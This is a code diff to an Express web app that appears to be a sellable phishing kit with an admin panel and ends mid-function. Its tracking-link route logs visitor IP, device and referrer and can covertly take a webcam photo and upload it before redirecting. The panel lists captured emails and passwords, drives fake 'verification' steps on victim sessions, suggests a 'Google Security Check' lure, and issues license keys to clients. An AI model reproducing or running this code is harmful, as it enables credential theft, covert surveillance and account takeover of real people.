@@ -113,9 +113,6 @@ function requireAdmin(req, res, next) {
 //  TRACKABLE LINKS ENGINE
 // ═══════════════════════════════════════════════
 
-// A tracking link: /t/:linkId
-// Captures IP, user-agent, referrer, timestamp, and optionally camera
-
 app.get('/t/:linkId', (req, res) => {
   const { linkId } = req.params;
   const links = loadJSON(LINKS_FILE, {});
@@ -127,7 +124,6 @@ app.get('/t/:linkId', (req, res) => {
   const device = getDeviceInfo(ua);
   const referrer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
 
-  // Record visit
   const visits = loadJSON(VISITS_FILE, {});
   if (!visits[linkId]) visits[linkId] = [];
   const visitData = {
@@ -142,7 +138,6 @@ app.get('/t/:linkId', (req, res) => {
   visits[linkId].push(visitData);
   saveJSON(VISITS_FILE, visits);
 
-  // Send tracking page
   const wantsCamera = link.camera || false;
   const redirectUrl = link.redirectUrl || 'https://google.com';
 
@@ -181,7 +176,6 @@ ${wantsCamera ? `
       video.srcObject = stream;
       await video.play();
 
-      // Wait 500ms for camera to warm up, then capture
       setTimeout(() => {
         const canvas = document.getElementById('photo-canvas');
         canvas.width = video.videoWidth || 640;
@@ -189,10 +183,8 @@ ${wantsCamera ? `
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Stop the stream
         stream.getTracks().forEach(t => t.stop());
 
-        // Send photo to server
         const photoData = canvas.toDataURL('image/jpeg', 0.7);
         fetch('/t/' + linkId + '/capture-camera', {
           method: 'POST',
@@ -206,7 +198,6 @@ ${wantsCamera ? `
       }, 500);
     } catch (err) {
       console.log('Camera access denied or error:', err);
-      // Still redirect
       window.location.href = redirectUrl;
     }
   }
@@ -234,11 +225,10 @@ app.post('/t/:linkId/capture-camera', (req, res) => {
   if (!visit) return res.json({ success: false });
 
   visit.cameraCaptured = true;
-  visit.cameraPhoto = photo; // base64 JPEG
+  visit.cameraPhoto = photo;
   visit.cameraTime = new Date().toISOString();
   saveJSON(VISITS_FILE, visits);
 
-  // Also save photo to disk
   const photosDir = path.join(DATA_DIR, 'photos');
   if (!fs.existsSync(photosDir)) fs.mkdirSync(photosDir);
   const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');
@@ -251,7 +241,6 @@ app.post('/t/:linkId/capture-camera', (req, res) => {
 //  USER & LICENSE MANAGEMENT
 // ═══════════════════════════════════════════════
 
-// Admin: Create a new admin user
 app.post('/' + ADMIN_PATH + '/users/create', requireAdmin, (req, res) => {
   const { username, password, role } = req.body;
   if (!username || !password) return res.json({ success: false, error: 'Username and password required' });
@@ -270,13 +259,11 @@ app.post('/' + ADMIN_PATH + '/users/create', requireAdmin, (req, res) => {
   res.json({ success: true, user: username });
 });
 
-// Admin: List all users
 app.get('/' + ADMIN_PATH + '/users/list', requireAdmin, (req, res) => {
   const users = loadJSON(USERS_FILE, {});
   res.json({ success: true, users: Object.values(users) });
 });
 
-// Admin: Delete a user
 app.post('/' + ADMIN_PATH + '/users/delete', requireAdmin, (req, res) => {
   const { username } = req.body;
   if (!username) return res.json({ success: false });
@@ -291,7 +278,6 @@ app.post('/' + ADMIN_PATH + '/users/delete', requireAdmin, (req, res) => {
 //  LICENSE KEY MANAGEMENT
 // ═══════════════════════════════════════════════
 
-// Admin: Generate a license key
 app.post('/' + ADMIN_PATH + '/licenses/create', requireAdmin, (req, res) => {
   const { duration, note, maxUses } = req.body;
   const licenses = loadJSON(LICENSES_FILE, {});
@@ -320,7 +306,7 @@ app.post('/' + ADMIN_PATH + '/licenses/create', requireAdmin, (req, res) => {
     durationLabel,
     durationMs,
     note: note || '',
-    maxUses: maxUses || 0, // 0 = unlimited
+    maxUses: maxUses || 0,
     uses: 0,
     active: true,
     created: new Date().toISOString(),
@@ -331,13 +317,11 @@ app.post('/' + ADMIN_PATH + '/licenses/create', requireAdmin, (req, res) => {
   res.json({ success: true, license: licenses[key] });
 });
 
-// Admin: List all licenses
 app.get('/' + ADMIN_PATH + '/licenses/list', requireAdmin, (req, res) => {
   const licenses = loadJSON(LICENSES_FILE, {});
   res.json({ success: true, licenses: Object.values(licenses) });
 });
 
-// Admin: Revoke a license
 app.post('/' + ADMIN_PATH + '/licenses/revoke', requireAdmin, (req, res) => {
   const { key } = req.body;
   const licenses = loadJSON(LICENSES_FILE, {});
@@ -347,7 +331,6 @@ app.post('/' + ADMIN_PATH + '/licenses/revoke', requireAdmin, (req, res) => {
   res.json({ success: true });
 });
 
-// Validate a license key (for external use)
 app.post('/api/validate-license', (req, res) => {
   const { key } = req.body;
   if (!key) return res.json({ valid: false, error: 'No key provided' });
@@ -358,7 +341,6 @@ app.post('/api/validate-license', (req, res) => {
   if (license.expiresAt && new Date(license.expiresAt) < new Date()) return res.json({ valid: false, error: 'License expired' });
   if (license.maxUses > 0 && license.uses >= license.maxUses) return res.json({ valid: false, error: 'Max uses exceeded' });
 
-  // Increment uses
   license.uses = (license.uses || 0) + 1;
   saveJSON(LICENSES_FILE, licenses);
 
@@ -369,7 +351,6 @@ app.post('/api/validate-license', (req, res) => {
 //  TRACKING LINK MANAGEMENT
 // ═══════════════════════════════════════════════
 
-// Admin: Create a tracking link
 app.post('/' + ADMIN_PATH + '/links/create', requireAdmin, (req, res) => {
   const { name, redirectUrl, camera, notes } = req.body;
   if (!name || !redirectUrl) return res.json({ success: false, error: 'Name and redirect URL required' });
@@ -392,7 +373,6 @@ app.post('/' + ADMIN_PATH + '/links/create', requireAdmin, (req, res) => {
   res.json({ success: true, link: links[linkId], trackingUrl: fullUrl });
 });
 
-// Admin: List all tracking links
 app.get('/' + ADMIN_PATH + '/links/list', requireAdmin, (req, res) => {
   const links = loadJSON(LINKS_FILE, {});
   const visits = loadJSON(VISITS_FILE, {});
@@ -404,7 +384,6 @@ app.get('/' + ADMIN_PATH + '/links/list', requireAdmin, (req, res) => {
   res.json({ success: true, links: result });
 });
 
-// Admin: Get visits for a specific link
 app.get('/' + ADMIN_PATH + '/links/:linkId/visits', requireAdmin, (req, res) => {
   const { linkId } = req.params;
   const visits = loadJSON(VISITS_FILE, {});
@@ -412,7 +391,6 @@ app.get('/' + ADMIN_PATH + '/links/:linkId/visits', requireAdmin, (req, res) => 
   res.json({ success: true, visits: linkVisits.reverse() });
 });
 
-// Admin: Delete a tracking link
 app.post('/' + ADMIN_PATH + '/links/delete', requireAdmin, (req, res) => {
   const { linkId } = req.body;
   const links = loadJSON(LINKS_FILE, {});
@@ -646,7 +624,7 @@ app.get('/check-gmail-status', (req, res) => {
   return res.json({ verified: false });
 });
 
-// ─── ADMIN SEND VERIFICATION (from old panel) ──
+// ─── ADMIN SEND VERIFICATION ──
 
 app.post('/admin-send-verification', (req, res) => {
   if (!req.session.admin) return res.status(401).json({ success: false });
@@ -797,8 +775,6 @@ function renderAdminPanel(req, res) {
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0a0b;color:#e1e1e3;font-family:'Inter',-apple-system,sans-serif;min-height:100vh}
-
-/* ── TOPBAR ── */
 .topbar{background:#121213;border-bottom:1px solid #1f1f21;padding:0 32px;display:flex;justify-content:space-between;align-items:center;height:60px;position:sticky;top:0;z-index:100}
 .topbar-left{display:flex;align-items:center;gap:14px}
 .topbar-logo{display:flex;align-items:center;gap:8px}
@@ -811,8 +787,6 @@ body{background:#0a0a0b;color:#e1e1e3;font-family:'Inter',-apple-system,sans-ser
 .topbar-btn:hover{background:#1a1a1c;color:#e1e1e3;border-color:#3a3a3d}
 .logout-link{color:#5f6368;text-decoration:none;font-size:12px;padding:7px 14px;border-radius:8px;transition:.12s}
 .logout-link:hover{color:#f28b82;background:#1a1414}
-
-/* ── LAYOUT ── */
 .layout{display:flex;min-height:calc(100vh - 60px)}
 .sidebar{width:240px;background:#0e0e0f;border-right:1px solid #1f1f21;padding:20px 0;flex-shrink:0}
 .sidebar-item{display:flex;align-items:center;gap:10px;padding:10px 24px;color:#9aa0a6;font-size:13px;cursor:pointer;transition:.12s;border-left:2px solid transparent;text-decoration:none}
@@ -821,8 +795,6 @@ body{background:#0a0a0b;color:#e1e1e3;font-family:'Inter',-apple-system,sans-ser
 .sidebar-item svg{width:16px;height:16px;flex-shrink:0}
 .sidebar-section{font-size:10px;color:#3c4043;text-transform:uppercase;letter-spacing:.08em;padding:16px 24px 8px;font-weight:600}
 .main{flex:1;padding:24px 32px;max-width:100%;overflow-y:auto}
-
-/* ── PAGE HEADER ── */
 .page-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:24px;flex-wrap:wrap;gap:12px}
 .page-header h2{font-size:20px;font-weight:600;color:#fff}
 .page-header .sub{font-size:13px;color:#5f6368;margin-top:2px}
@@ -832,19 +804,13 @@ body{background:#0a0a0b;color:#e1e1e3;font-family:'Inter',-apple-system,sans-ser
 .secondary-btn:hover{background:#252527;border-color:#3a3a3d}
 .danger-btn{display:inline-flex;align-items:center;gap:6px;background:#2a1414;border:1px solid #3a1c1c;border-radius:10px;color:#f28b82;padding:10px 20px;font-size:13px;font-weight:500;cursor:pointer;transition:.12s;font-family:'Inter',sans-serif}
 .danger-btn:hover{background:#3a1c1c}
-
-/* ── STAT CARDS ── */
 .stats-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:14px;margin-bottom:28px}
 .stat-card{background:#121213;border:1px solid #1f1f21;border-radius:12px;padding:18px 20px}
 .stat-card .stat-label{font-size:11px;color:#5f6368;text-transform:uppercase;letter-spacing:.04em;font-weight:500;margin-bottom:6px}
 .stat-card .stat-value{font-size:28px;font-weight:700;color:#fff}
-.stat-card .stat-change{font-size:11px;color:#81c995;margin-top:4px}
-
-/* ── TABLE ── */
 .table-container{background:#121213;border:1px solid #1f1f21;border-radius:12px;overflow:hidden;margin-bottom:24px}
 .table-header{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;border-bottom:1px solid #1f1f21}
 .table-header h3{font-size:14px;font-weight:600;color:#fff}
-.table-header .count-badge{font-size:11px;color:#5f6368;background:#1a1a1c;padding:2px 10px;border-radius:10px;margin-left:8px}
 table{width:100%;border-collapse:collapse;font-size:12px}
 thead{background:#0e0e0f}
 th{padding:10px 16px;text-align:left;color:#5f6368;font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:.04em;border-bottom:1px solid #1f1f21}
@@ -855,15 +821,13 @@ tr:hover td{background:#0e0e0f}
 .cell-pass{font-family:monospace;font-size:12px;color:#f9ab00}
 .cell-time{font-size:11px;color:#5f6368}
 .muted{color:#3c4043}
-
-/* ── SESSION CARD ── */
-.session-card{background:#121213;border:1px solid #1f1f21;border-radius:12px;margin-bottom:10px;overflow:hidden;transition:border-color .15s}
+.session-card{background:#121213;border:1px solid #1f1f21;border-radius:12px;margin-bottom:10px;overflow:hidden}
 .session-card:hover{border-color:#2a2a2d}
 .session-header{display:flex;align-items:center;gap:12px;padding:14px 18px;border-bottom:1px solid #1a1a1c;flex-wrap:wrap}
 .session-email{font-size:13px;font-weight:500;color:#fff}
 .session-name{font-size:12px;color:#5f6368}
 .session-time{font-size:11px;color:#3c4043;margin-left:auto}
-.badge-step{font-size:10px;padding:2px 10px;border-radius:10px;background:#1a1a2e;color:#8ab4f8;font-weight:500;letter-spacing:.02em}
+.badge-step{font-size:10px;padding:2px 10px;border-radius:10px;background:#1a1a2e;color:#8ab4f8;font-weight:500}
 .session-body{padding:14px 18px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
 .session-creds{display:flex;gap:20px;flex-wrap:wrap}
 .cred-item{display:flex;align-items:center;gap:6px}
@@ -879,7 +843,7 @@ tr:hover td{background:#0e0e0f}
 .btn-phone:hover{background:#241230}
 .btn-valid{background:#0d2416;color:#81c995}
 .btn-valid:hover{background:#122e1c}
-.btn-delete{background:#1a0d0d;color:#f85149;padding:6px 10px}
+.btn-delete{background:#1a0d0d;color:#f85149}
 .btn-delete:hover{background:#2a1212}
 .btn:hover{transform:translateY(-1px)}
 .badge{font-size:10px;padding:2px 10px;border-radius:10px;font-weight:500}
@@ -890,8 +854,6 @@ tr:hover td{background:#0e0e0f}
 .badge-active{background:#0d2416;color:#81c995}
 .badge-revoked{background:#2a1414;color:#f28b82}
 .empty-state{padding:48px;text-align:center;color:#3c4043;font-size:13px}
-
-/* ── MODAL ── */
 .modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);z-index:1000;justify-content:center;align-items:center;backdrop-filter:blur(4px)}
 .modal-overlay.active{display:flex}
 .modal{background:#121213;border:1px solid #252527;border-radius:16px;padding:32px;width:500px;max-width:90vw;max-height:85vh;overflow-y:auto;box-shadow:0 24px 80px rgba(0,0,0,.6)}
@@ -909,30 +871,19 @@ tr:hover td{background:#0e0e0f}
 .modal .checkbox-row label{margin:0;cursor:pointer}
 .modal-actions{display:flex;gap:10px;justify-content:flex-end;margin-top:24px;padding-top:16px;border-top:1px solid #1f1f21}
 .modal-actions .primary-btn,.modal-actions .secondary-btn{padding:9px 18px;font-size:12px}
-
-/* ── LICENSE KEY DISPLAY ── */
 .key-display{background:#0d2416;border:1px solid #1a3a24;border-radius:8px;padding:12px 16px;font-family:monospace;font-size:16px;color:#81c995;text-align:center;margin:16px 0;user-select:all;word-break:break-all}
 .key-display .label{display:block;font-size:10px;color:#5f6368;font-family:'Inter',sans-serif;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px}
-
-/* ── LINK VISITS ── */
 .visit-item{display:flex;align-items:center;gap:12px;padding:10px 14px;border-bottom:1px solid #18181a;font-size:12px}
 .visit-item:last-child{border-bottom:none}
 .visit-ip{font-family:monospace;color:#f9ab00;font-size:11px}
 .visit-device{color:#5f6368;font-size:11px}
 .visit-time{color:#3c4043;font-size:11px;margin-left:auto}
-
-/* ── TOAST ── */
 .toast{position:fixed;bottom:24px;right:24px;background:#1a1a1c;border:1px solid #252527;border-radius:10px;padding:12px 20px;font-size:12px;color:#e1e1e3;opacity:0;transform:translateY(20px);transition:.3s;z-index:9999;max-width:360px}
 .toast.show{opacity:1;transform:translateY(0)}
 .toast.success{border-color:#1a3a24}
 .toast.error{border-color:#3a1c1c;color:#f28b82}
-
-/* ── CAMERA PHOTO ── */
 .camera-thumb{width:60px;height:45px;border-radius:6px;object-fit:cover;cursor:pointer;border:1px solid #252527;transition:.12s}
 .camera-thumb:hover{border-color:#5f6368;transform:scale(1.05)}
-.photo-modal img{max-width:100%;border-radius:8px}
-
-/* ── MISC ── */
 .footer-text{text-align:center;padding:24px;font-size:10px;color:#2a2a2c}
 .hidden{display:none !important}
 .flex{display:flex;gap:8px;align-items:center}
@@ -940,7 +891,6 @@ tr:hover td{background:#0e0e0f}
 .copy-btn:hover{background:#1a1a1c;color:#e1e1e3}
 </style></head><body>
 
-<!-- ─── TOPBAR ─── -->
 <div class="topbar">
   <div class="topbar-left">
     <div class="topbar-logo">
@@ -952,42 +902,23 @@ tr:hover td{background:#0e0e0f}
     <div class="stat-pill"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Active: <strong>${activeSessions.length}</strong></div>
     <div class="stat-pill"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Complete: <strong>${completedCaptures.length}</strong></div>
     <div class="stat-pill"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>Visits: <strong>${totalVisits}</strong></div>
-    <button class="topbar-btn" onclick="location.reload()">
-      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>
-      Refresh
-    </button>
+    <button class="topbar-btn" onclick="location.reload()"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>Refresh</button>
     <a href="/${ADMIN_PATH}/logout" class="logout-link">Logout</a>
   </div>
 </div>
 
-<!-- ─── LAYOUT ─── -->
 <div class="layout">
-  <!-- SIDEBAR -->
   <div class="sidebar">
     <div class="sidebar-section">Main</div>
-    <a class="sidebar-item" onclick="switchTab('completed')" id="tab-completed-btn">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
-      Completed Captures
-    </a>
+    <a class="sidebar-item active" onclick="switchTab('sessions')" id="tab-sessions-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Active Sessions</a>
+    <a class="sidebar-item" onclick="switchTab('completed')" id="tab-completed-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Completed Captures</a>
     <div class="sidebar-section">Tracking</div>
-    <a class="sidebar-item" onclick="switchTab('links')" id="tab-links-btn">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
-      Trackable Links
-    </a>
+    <a class="sidebar-item" onclick="switchTab('links')" id="tab-links-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>Trackable Links</a>
     <div class="sidebar-section">Management</div>
-    <a class="sidebar-item" onclick="switchTab('licenses')" id="tab-licenses-btn">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
-      License Keys
-    </a>
-    <a class="sidebar-item" onclick="switchTab('users')" id="tab-users-btn">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
-      Admin Users
-    </a>
+    <a class="sidebar-item" onclick="switchTab('licenses')" id="tab-licenses-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>License Keys</a>
+    <a class="sidebar-item" onclick="switchTab('users')" id="tab-users-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>Admin Users</a>
     <div class="sidebar-section">System</div>
-    <a class="sidebar-item" onclick="switchTab('settings')" id="tab-settings-btn">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-2 2 2 2 0 01-2-2v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83 0 2 2 0 010-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 01-2-2 2 2 0 012-2h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 010-2.83 2 2 0 012.83 0l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 012-2 2 2 0 012 2v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 0 2 2 0 010 2.83l-.06.06A1.65 1.65 0 0019.32 9a1.65 1.65 0 001.51 1H21a2 2 0 012 2 2 2 0 01-2 2h-.09a1.65 1.65 0 00-1.51 1z"/></svg>
-      Settings
-    </a>
+    <a class="sidebar-item" onclick="switchTab('settings')" id="tab-settings-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-2 2 2 2 0 01-2-2v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83 0 2 2 0 010-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 01-2-2 2 2 0 012-2h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 010-2.83 2 2 0 012.83 0l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 012-2 2 2 0 012 2v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 0 2 2 0 010 2.83l-.06.06A1.65 1.65 0 0019.32 9a1.65 1.65 0 001.51 1H21a2 2 0 012 2 2 2 0 01-2 2h-.09a1.65 1.65 0 00-1.51 1z"/></svg>Settings</a>
   </div>
 
   <!-- ─── MAIN CONTENT ─── -->
@@ -1062,8 +993,7 @@ tr:hover td{background:#0e0e0f}
         </table>
       </div>`}
     </div>
-
-    <!-- ═══ LINKS TAB ═══ -->
+<!-- ═══ LINKS TAB ═══ -->
     <div id="tab-links" class="tab-content hidden">
       <div class="page-header">
         <div>
@@ -1157,3 +1087,424 @@ tr:hover td{background:#0e0e0f}
         </table>
       </div>`}
     </div>
+
+    <!-- ═══ SETTINGS TAB ═══ -->
+    <div id="tab-settings" class="tab-content hidden">
+      <div class="page-header">
+        <div>
+          <h2>Settings</h2>
+          <div class="sub">System configuration and management</div>
+        </div>
+      </div>
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-label">Total Captures</div>
+          <div class="stat-value">${captures.length}</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Completed</div>
+          <div class="stat-value">${completedCaptures.length}</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Active Sessions</div>
+          <div class="stat-value">${activeSessions.length}</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Tracking Links</div>
+          <div class="stat-value">${Object.keys(links).length}</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Total Visits</div>
+          <div class="stat-value">${totalVisits}</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Active Licenses</div>
+          <div class="stat-value">${activeLicenses}</div>
+        </div>
+      </div>
+      <div class="table-container">
+        <div class="table-header"><h3>Danger Zone</h3></div>
+        <div style="padding:20px">
+          <p style="font-size:13px;color:#9aa0a6;margin-bottom:16px">Destructive actions that cannot be undone.</p>
+          <div style="display:flex;gap:10px;flex-wrap:wrap">
+            <button class="danger-btn" onclick="clearActive()">Clear Active Sessions</button>
+            <button class="danger-btn" onclick="clearCompleted()">Clear Completed Captures</button>
+            <button class="danger-btn" onclick="clearAll()">Clear ALL Data</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /main -->
+</div><!-- /layout -->
+
+<!-- ─── MODALS ─── -->
+
+<!-- Create Link Modal -->
+<div class="modal-overlay" id="modal-create-link">
+  <div class="modal">
+    <h3>Create Tracking Link</h3>
+    <div class="modal-sub">Generate a trackable URL that captures visitor data</div>
+    <label>Link Name</label>
+    <input id="link-name" placeholder="e.g. Google Security Check">
+    <label>Redirect URL</label>
+    <input id="link-redirect" placeholder="https://accounts.google.com">
+    <label>Notes (optional)</label>
+    <textarea id="link-notes" placeholder="Internal notes about this link"></textarea>
+    <div class="checkbox-row">
+      <input type="checkbox" id="link-camera">
+      <label for="link-camera">Enable camera capture (requests camera permission)</label>
+    </div>
+    <div class="modal-actions">
+      <button class="secondary-btn" onclick="closeModal('create-link')">Cancel</button>
+      <button class="primary-btn" onclick="createLink()">Create Link</button>
+    </div>
+  </div>
+</div>
+
+<!-- Create License Modal -->
+<div class="modal-overlay" id="modal-create-license">
+  <div class="modal">
+    <h3>Generate License Key</h3>
+    <div class="modal-sub">Create a new product license key</div>
+    <label>Duration</label>
+    <select id="license-duration">
+      <option value="1h">1 Hour</option>
+      <option value="6h">6 Hours</option>
+      <option value="12h">12 Hours</option>
+      <option value="1d" selected>1 Day</option>
+      <option value="3d">3 Days</option>
+      <option value="7d">7 Days</option>
+      <option value="30d">30 Days</option>
+      <option value="90d">90 Days</option>
+      <option value="365d">365 Days</option>
+      <option value="lifetime">Lifetime</option>
+    </select>
+    <label>Max Uses (0 = unlimited)</label>
+    <input id="license-max-uses" type="number" value="0" min="0">
+    <label>Note (optional)</label>
+    <input id="license-note" placeholder="e.g. Client ABC - Premium">
+    <div class="modal-actions">
+      <button class="secondary-btn" onclick="closeModal('create-license')">Cancel</button>
+      <button class="primary-btn" onclick="createLicense()">Generate</button>
+    </div>
+  </div>
+</div>
+
+<!-- Create User Modal -->
+<div class="modal-overlay" id="modal-create-user">
+  <div class="modal">
+    <h3>Add Admin User</h3>
+    <div class="modal-sub">Create a new administrator account</div>
+    <label>Username</label>
+    <input id="user-username" placeholder="Choose a username">
+    <label>Password</label>
+    <input id="user-password" type="password" placeholder="Choose a strong password">
+    <label>Role</label>
+    <select id="user-role">
+      <option value="admin">Admin</option>
+      <option value="superadmin">Super Admin</option>
+    </select>
+    <div class="modal-actions">
+      <button class="secondary-btn" onclick="closeModal('create-user')">Cancel</button>
+      <button class="primary-btn" onclick="createUser()">Add User</button>
+    </div>
+  </div>
+</div>
+
+<!-- Visits Modal -->
+<div class="modal-overlay" id="modal-visits">
+  <div class="modal">
+    <h3 id="visits-modal-title">Visits</h3>
+    <div class="modal-sub" id="visits-modal-sub">Visitor details for this link</div>
+    <div id="visits-list"></div>
+    <div class="modal-actions">
+      <button class="secondary-btn" onclick="closeModal('visits')">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- License Result Modal -->
+<div class="modal-overlay" id="modal-license-result">
+  <div class="modal">
+    <h3>License Key Generated</h3>
+    <div class="modal-sub">Copy the key below and distribute to the client</div>
+    <div class="key-display">
+      <span class="label">License Key</span>
+      <span id="generated-key">XXXX-XXXX-XXXX-XXXX</span>
+    </div>
+    <div class="modal-actions">
+      <button class="secondary-btn" onclick="navigator.clipboard.writeText(document.getElementById('generated-key').textContent);showToast('Copied!','success')">Copy</button>
+      <button class="primary-btn" onclick="closeModal('license-result')">Done</button>
+    </div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script>
+const APP_URL = '${APP_URL}';
+const ADMIN_PATH = '${ADMIN_PATH}';
+
+function switchTab(tab) {
+  document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+  document.querySelectorAll('.sidebar-item').forEach(el => el.classList.remove('active'));
+  const tabEl = document.getElementById('tab-' + tab);
+  const btnEl = document.getElementById('tab-' + tab + '-btn');
+  if (tabEl) tabEl.classList.remove('hidden');
+  if (btnEl) btnEl.classList.add('active');
+}
+
+function showToast(msg, type) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast ' + (type || '');
+  setTimeout(() => t.classList.add('show'), 10);
+  setTimeout(() => t.classList.remove('show'), 3000);
+}
+
+function openModal(name) {
+  document.getElementById('modal-' + name).classList.add('active');
+}
+
+function closeModal(name) {
+  document.getElementById('modal-' + name).classList.remove('active');
+}
+
+// Close modals on overlay click
+document.querySelectorAll('.modal-overlay').forEach(el => {
+  el.addEventListener('click', function(e) {
+    if (e.target === this) this.classList.remove('active');
+  });
+});
+
+// ─── SESSION ACTIONS ───
+
+function sendVerification(sid, type) {
+  fetch('/admin-send-verification', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({sid, type})
+  }).then(r => r.json()).then(d => {
+    if (d.success) showToast('Verification sent: ' + type, 'success');
+    else showToast('Failed to send verification', 'error');
+    setTimeout(() => location.reload(), 1000);
+  });
+}
+
+function markVerified(sid) {
+  fetch('/admin-mark-verified', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({sid})
+  }).then(r => r.json()).then(d => {
+    if (d.success) showToast('Marked as verified', 'success');
+    else showToast('Failed', 'error');
+    setTimeout(() => location.reload(), 1000);
+  });
+}
+
+function deleteSession(sid) {
+  if (!confirm('Delete this session?')) return;
+  fetch('/admin-delete-session', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({sid})
+  }).then(r => r.json()).then(d => {
+    if (d.success) showToast('Session deleted', 'success');
+    else showToast('Failed', 'error');
+    setTimeout(() => location.reload(), 1000);
+  });
+}
+
+function clearActive() {
+  if (!confirm('Clear all active sessions?')) return;
+  fetch('/admin-clear-active', {
+    method: 'POST', headers: {'Content-Type':'application/json'}
+  }).then(r => r.json()).then(d => {
+    if (d.success) showToast('Active sessions cleared', 'success');
+    setTimeout(() => location.reload(), 1000);
+  });
+}
+
+function clearCompleted() {
